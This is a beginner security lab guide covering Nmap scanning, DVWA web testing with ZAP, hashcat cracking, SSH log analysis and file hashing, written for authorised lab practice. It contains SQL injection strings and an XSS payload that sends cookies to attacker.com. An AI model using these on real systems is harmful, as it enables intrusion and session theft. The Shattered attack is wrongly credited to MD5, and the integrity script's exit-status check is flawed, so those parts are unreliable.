# Beginner Labs

These labs assume familiarity with basic command-line usage and introductory networking concepts. Each lab includes a clear objective, required tools, step-by-step instructions, and expected outcomes.

All labs should be performed in an isolated, controlled environment. Never perform scanning, exploitation, or analysis against systems you do not own or have explicit written authorization to test.

---

## Lab Index

| Lab | Topic | Time Estimate |
|-----|-------|---------------|
| [Lab 01: Network Scanning with Nmap](#lab-01-network-scanning-with-nmap) | Reconnaissance | 45 minutes |
| [Lab 02: Web Application Vulnerability Identification](#lab-02-web-application-vulnerability-identification) | Web Security | 60 minutes |
| [Lab 03: Password Policy Testing and Cracking](#lab-03-password-policy-testing-and-cracking) | Authentication | 45 minutes |
| [Lab 04: Log Analysis Fundamentals](#lab-04-log-analysis-fundamentals) | Blue Team | 60 minutes |
| [Lab 05: Hash Analysis and File Integrity](#lab-05-hash-analysis-and-file-integrity) | Cryptography | 30 minutes |

---

## Lab 01: Network Scanning with Nmap

### Objective

Use Nmap to discover hosts, open ports, and running services on a target network. Understand how to interpret scan output and what information is exposed.

### Environment

- Kali Linux VM (or any Linux with Nmap installed)
- Target: Your own lab network or a dedicated practice range (e.g., HackTheBox Starting Point, TryHackMe)
- Nmap 7.90+

### Setup

```bash
# Verify Nmap installation
nmap --version

# For practice against safe targets, use scanme.nmap.org (authorized by Nmap project)
# Do not scan this target aggressively or repeatedly
```

### Instructions

**Step 1: Ping sweep to discover live hosts**

```bash
# ICMP ping sweep across a /24 range
nmap -sn 192.168.1.0/24

# Output shows which hosts responded
# Note: many hosts block ICMP; this is not a definitive live-host list
```

**Step 2: Basic TCP port scan**

```bash
# SYN scan (requires root/sudo) of top 1000 ports
sudo nmap -sS 192.168.1.10

# Full port scan (all 65535 ports)
sudo nmap -sS -p- 192.168.1.10

# Scan specific ports
sudo nmap -sS -p 22,80,443,3389,445 192.168.1.10
```

**Step 3: Service and version detection**

```bash
# Detect service versions on open ports
sudo nmap -sV 192.168.1.10

# Aggressive version detection (more accurate, more intrusive)
sudo nmap -sV --version-intensity 5 192.168.1.10
```

**Step 4: Operating system detection**

```bash
# OS detection (requires open and closed TCP port)
sudo nmap -O 192.168.1.10

# Combined: service + OS detection
sudo nmap -sV -O 192.168.1.10
```

**Step 5: Script scanning**

```bash
# Run default scripts against target
sudo nmap -sC 192.168.1.10

# Combined scan with scripts and version detection
sudo nmap -sC -sV 192.168.1.10

# Specific script examples
sudo nmap --script=http-headers 192.168.1.10 -p 80,443
sudo nmap --script=ssl-enum-ciphers 192.168.1.10 -p 443
sudo nmap --script=smb-security-mode 192.168.1.10 -p 445
```

**Step 6: Output formats**

```bash
# Save output in all formats
sudo nmap -sC -sV -oA /tmp/scan_results 192.168.1.10

# This creates: .nmap (readable), .xml (parseable), .gnmap (greppable)

# Parse XML output
grep "portid" /tmp/scan_results.xml
```

### Analysis Questions

After completing the scan:
1. What services are running? Are any unexpected or unnecessary?
2. What software versions are detected? Search these against CVE databases.
3. What does the operating system fingerprint reveal?
4. If this were a real target, which services would you investigate further?

### Expected Outcome

You should be able to produce a comprehensive port and service inventory of a target host, understand what information is publicly visible from an attacker's perspective, and identify potential attack surface.

---

## Lab 02: Web Application Vulnerability Identification

### Objective

Use OWASP ZAP to perform passive and active scanning of a deliberately vulnerable web application, identify common vulnerabilities, and understand their root causes.

### Environment

- Kali Linux or any OS with Docker
- OWASP ZAP 2.14+
- DVWA (Damn Vulnerable Web Application) running locally

### Setup

```bash
# Run DVWA via Docker
docker run --rm -d -p 80:80 vulnerables/web-dvwa

# Access DVWA at http://localhost
# Default credentials: admin / password
# Navigate to: Setup / Reset DB
# Set security level to "Low" for initial exploration
```

### Instructions

**Step 1: Configure ZAP proxy**

```
1. Start OWASP ZAP
2. Go to Tools > Options > Local Proxies
3. Note the proxy address (default: 127.0.0.1:8080)
4. Configure your browser to use this proxy
   - Firefox: Settings > Network Settings > Manual proxy > HTTP Proxy: 127.0.0.1:8080
```

**Step 2: Passive spider and exploration**

```
1. In ZAP: Right-click "Sites" > Include in Context > Default Context
2. Browse through DVWA manually while ZAP records traffic
3. Visit all pages: brute force, command injection, XSS, SQL injection, file inclusion, etc.
4. ZAP will display captured requests in the "Sites" tree
```

**Step 3: Active scan**

```
1. In ZAP: Right-click the DVWA site in Sites tree
2. Select: Attack > Active Scan
3. Select the target URL
4. Click Start Scan
5. Wait for completion (10-15 minutes)
```

**Step 4: SQL Injection testing (manual)**

```
Navigate to: DVWA > SQL Injection
Try these inputs in the User ID field:

1. Valid input: 1
   Observe: Returns user data

2. Syntax break test: '
   Observe: SQL error (confirms SQL injection)

3. Always-true: 1' OR '1'='1
   Observe: Returns all users

4. Comment injection: 1' --
   Observe: Returns first user regardless of query logic

5. UNION test: 1' UNION SELECT 1,2--
   Observe: UNION injection working if second result appears

6. Database version: 1' UNION SELECT 1,version()--
   Observe: Database version in output

7. Table enumeration: 1' UNION SELECT table_name,2 FROM information_schema.tables--
```

**Step 5: XSS testing (manual)**

```
Navigate to: DVWA > XSS (Reflected)

1. Basic XSS: <script>alert(1)</script>
   Observe: Alert box appears

2. Cookie theft payload: <script>document.location='http://attacker.com/?c='+document.cookie</script>
   (Use your local listener if testing)

Navigate to: DVWA > XSS (Stored)

1. In the Name field: <script>alert('stored')</script>
2. Post the comment
3. Refresh the page
   Observe: Alert fires every time page loads
```

**Step 6: Review ZAP alerts**

```
1. Click the Alerts tab in ZAP
2. Review each alert by category
3. For each alert: read the description, risk level, solution, and reference
4. Note which vulnerabilities ZAP found automatically vs. which required manual testing
```

### Analysis Questions

1. Which vulnerabilities did ZAP detect automatically?
2. Which required manual testing?
3. What is the risk level assigned to SQL injection vs. XSS? Is this appropriate?
4. What HTTP security headers are missing from DVWA responses?
5. If you found these vulnerabilities in a real application, what would be your remediation recommendations?

---

## Lab 03: Password Policy Testing and Cracking

### Objective

Understand password hashing, practice offline hash cracking, and evaluate password policy effectiveness.

### Environment

- Kali Linux with hashcat and John the Ripper
- Wordlist: `/usr/share/wordlists/rockyou.txt` (standard on Kali)

### Instructions

**Step 1: Generate test hashes**

```bash
# MD5 hash (deprecated, educational only)
echo -n "password123" | md5sum

# SHA-256
echo -n "password123" | sha256sum

# bcrypt (requires Python)
python3 -c "import bcrypt; print(bcrypt.hashpw(b'password123', bcrypt.gensalt(rounds=12)).decode())"

# Store test hashes
cat > /tmp/test_hashes.txt << 'EOF'
482c811da5d5b4bc6d497ffa98491e38:password123
5f4dcc3b5aa765d61d8327deb882cf99:password
21232f297a57a5a743894a0e4a801fc3:admin
EOF
```

**Step 2: Dictionary attack with hashcat**

```bash
# Identify hash type
hashcat --identify /tmp/test_hashes.txt

# MD5 dictionary attack (mode 0)
hashcat -m 0 /tmp/test_hashes.txt /usr/share/wordlists/rockyou.txt

# With rules (generate mutations: capitalization, l33tspeak, append numbers)
hashcat -m 0 /tmp/test_hashes.txt /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule

# Show cracked passwords
hashcat -m 0 /tmp/test_hashes.txt --show
```

**Step 3: Crack bcrypt hashes**

```bash
# Generate bcrypt hash for cracking
python3 -c "import bcrypt; print(bcrypt.hashpw(b'abc123', bcrypt.gensalt(rounds=10)).decode())" > /tmp/bcrypt.txt

# Attempt to crack (will be very slow by design)
hashcat -m 3200 /tmp/bcrypt.txt /usr/share/wordlists/rockyou.txt --status-timer=10

# Note the time difference between MD5 and bcrypt — this is the point
```

**Step 4: Mask attack (brute force with pattern)**

```bash
# Crack a password matching pattern: 4 digits
# Pattern: ?d?d?d?d = four digits
hashcat -m 0 target_hash.txt -a 3 "?d?d?d?d"

# Pattern: uppercase letter + 6 lowercase + 2 digits
hashcat -m 0 target_hash.txt -a 3 "?u?l?l?l?l?l?l?d?d"
```

### Analysis Questions

1. How long did the dictionary attack take for MD5 vs. bcrypt?
2. What percentage of the rockyou.txt wordlist was cracked against the test hashes?
3. Why does password length matter more than complexity for resisting brute force?
4. What makes a password resistant to dictionary attacks even with rules?

---

## Lab 04: Log Analysis Fundamentals

### Objective

Practice reading and analyzing security-relevant log files to identify suspicious activity.

### Setup

```bash
# Create a directory for lab files
mkdir -p /tmp/log-lab

# Generate sample authentication log
cat > /tmp/log-lab/auth.log << 'EOF'
Jan 15 08:23:01 server sshd[1234]: Accepted publickey for admin from 192.168.1.10 port 54321 ssh2
Jan 15 08:47:33 server sshd[2341]: Failed password for admin from 203.0.113.15 port 41234 ssh2
Jan 15 08:47:34 server sshd[2342]: Failed password for admin from 203.0.113.15 port 41235 ssh2
Jan 15 08:47:35 server sshd[2343]: Failed password for admin from 203.0.113.15 port 41236 ssh2
Jan 15 08:47:36 server sshd[2344]: Failed password for root from 203.0.113.15 port 41237 ssh2
Jan 15 08:47:37 server sshd[2345]: Failed password for root from 203.0.113.15 port 41238 ssh2
Jan 15 08:47:38 server sshd[2346]: Failed password for ubuntu from 203.0.113.15 port 41239 ssh2
Jan 15 09:02:11 server sshd[3001]: Accepted password for deploy from 10.0.0.5 port 22345 ssh2
Jan 15 23:41:02 server sshd[4455]: Accepted password for admin from 185.220.101.45 port 55001 ssh2
Jan 16 02:15:33 server sshd[5521]: Accepted publickey for admin from 192.168.1.10 port 54999 ssh2
EOF
```

### Instructions

**Step 1: Basic log analysis with grep and awk**

```bash
# Count failed login attempts
grep "Failed password" /tmp/log-lab/auth.log | wc -l

# Identify source IPs of failures
grep "Failed password" /tmp/log-lab/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn

# Identify targeted usernames
grep "Failed password" /tmp/log-lab/auth.log | awk '{print $9}' | sort | uniq -c | sort -rn

# Show successful logins
grep "Accepted" /tmp/log-lab/auth.log

# Show successful logins with source IP and time
grep "Accepted" /tmp/log-lab/auth.log | awk '{print $1, $2, $3, $9, $11}'
```

**Step 2: Identify brute force pattern**

```bash
# Count login attempts per source IP
grep "Failed password" /tmp/log-lab/auth.log | \
    awk '{print $11}' | sort | uniq -c | sort -rn

# Show timeline of attempts from suspicious IP
grep "203.0.113.15" /tmp/log-lab/auth.log | awk '{print $1,$2,$3,$6,$9,$11}'
```

**Step 3: Identify anomalous successful login**

```bash
# Show all successful logins
grep "Accepted" /tmp/log-lab/auth.log | awk '{print $1,$2,$3,$9,$11}'

# The login at 23:41:02 from 185.220.101.45 is suspicious:
# 1. Unusual time (late at night)
# 2. IP not previously seen in successful logins (185.220.101.x is known Tor exit nodes)
# 3. Used password authentication, not public key (others used publickey)

# Verify this finding:
grep "Accepted" /tmp/log-lab/auth.log | awk '{print $11}' | sort -u
# 192.168.1.10 (normal source, publickey)
# 10.0.0.5 (internal, password)
# 185.220.101.45 (external, unusual, password - SUSPICIOUS)
```

**Step 4: Document findings**

For each suspicious finding, document:
- What was observed (raw log evidence)
- Why it is suspicious
- What additional investigation is warranted
- What response action is recommended

---

## Lab 05: Hash Analysis and File Integrity

### Objective

Use cryptographic hashes to verify file integrity and detect tampering.

### Instructions

**Step 1: Generate baseline hashes**

```bash
# Create test files
echo "This is a production configuration file." > /tmp/config.txt
echo "This is an application binary." > /tmp/app.bin

# Generate SHA-256 hashes and store baseline
sha256sum /tmp/config.txt /tmp/app.bin > /tmp/baseline_hashes.sha256
cat /tmp/baseline_hashes.sha256
```

**Step 2: Verify integrity**

```bash
# Verify files against baseline (should succeed)
sha256sum -c /tmp/baseline_hashes.sha256

# Output: file: OK (both files unchanged)
```

**Step 3: Simulate tampering**

```bash
# Modify one file (simulating unauthorized change)
echo "MODIFIED BY ATTACKER" >> /tmp/config.txt

# Attempt to verify again
sha256sum -c /tmp/baseline_hashes.sha256

# Output: /tmp/config.txt: FAILED (hash mismatch detected)
```

**Step 4: Understand hash properties**

```bash
# Demonstrate avalanche effect: small change, completely different hash
echo "password" | sha256sum
echo "Password" | sha256sum
echo "password1" | sha256sum

# Demonstrate collision resistance concept:
# MD5 collision exists but SHA-256 does not have known collisions
# Show that MD5 of two different files can match (conceptual):
echo "MD5 is broken - demonstrated by Shattered attack (2017)"
echo "Never use MD5 for integrity verification of security-critical files"
```

**Step 5: File integrity monitoring concept**

```bash
# Simple FIM script
cat > /tmp/fim_check.sh << 'EOF'
#!/bin/bash
BASELINE="/tmp/baseline_hashes.sha256"
echo "=== File Integrity Check $(date) ==="
sha256sum -c "$BASELINE" 2>&1 | grep -v "^$" 
if [ $? -eq 0 ]; then
    echo "All files intact."
else
    echo "INTEGRITY VIOLATION DETECTED"
fi
EOF
chmod +x /tmp/fim_check.sh
/tmp/fim_check.sh
```
